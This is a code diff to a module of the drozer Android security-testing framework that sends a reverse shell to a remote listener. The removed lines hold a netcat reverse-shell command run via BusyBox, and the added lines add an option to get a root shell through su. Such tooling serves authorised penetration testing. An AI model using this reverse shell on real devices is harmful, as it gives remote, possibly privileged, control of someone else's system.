@@ -1,24 +1,31 @@
 from drozer.modules import common, Module
 
-class Send(Module, common.BusyBox, common.Shell):
+class Send(Module, common.Shell, common.SuperUser):
 
     name = "Send an ASH shell to a remote listener."
-    description = """Send an ASH Shell to a remote listener.
+    description = """Sends an Java Reverse Shell to the Agent.
 
-This module executes `nc IP PORT -e ash -i`, using BusyBox. This will send an ASH shell to a netcat listener."""
+This module sends a Java reverse shell to the Agent."""
     examples = ""
-    author = "Tyrone (@mwrlabs)"
-    date = "2013-07-25"
+    author = ["Tyrone (@mwrlabs)", "Thomas Cross (@ReversecLabs)"]
+    date = "2025-06-24"
     license = "BSD (3 clause)"
     path = ["shell"]
 
     def add_arguments(self, parser):
         parser.add_argument("ip", help="ip address of the remote listener")
         parser.add_argument("port", help="port address of the remote listener")
+        parser.add_argument("-p", "--privileged", action="store_true", default=False, help="request root to perform the task in a privileged context")
 
     def execute(self, arguments):
-        if (self.isBusyBoxInstalled() == True):
-            self.busyBoxExec("nc " + arguments.ip + " " + arguments.port + " -e " + self.busyboxPath() + " ash -i &")
-        else:
-            self.stderr.write("This command requires BusyBox to complete. Run tools.setup.busybox and then retry.\n")
-            
+        command = "sh"
+
+        privileged = arguments.privileged
+        if privileged:
+            if self.isAnySuInstalled():
+                command = self.suPath() + " -c \"%s\"" % command
+            else:
+                self.stdout.write("su is not installed...reverting back to unprivileged mode\n")
+                privileged = False
+
+        self.reverseShell(command, arguments.ip, arguments.port)
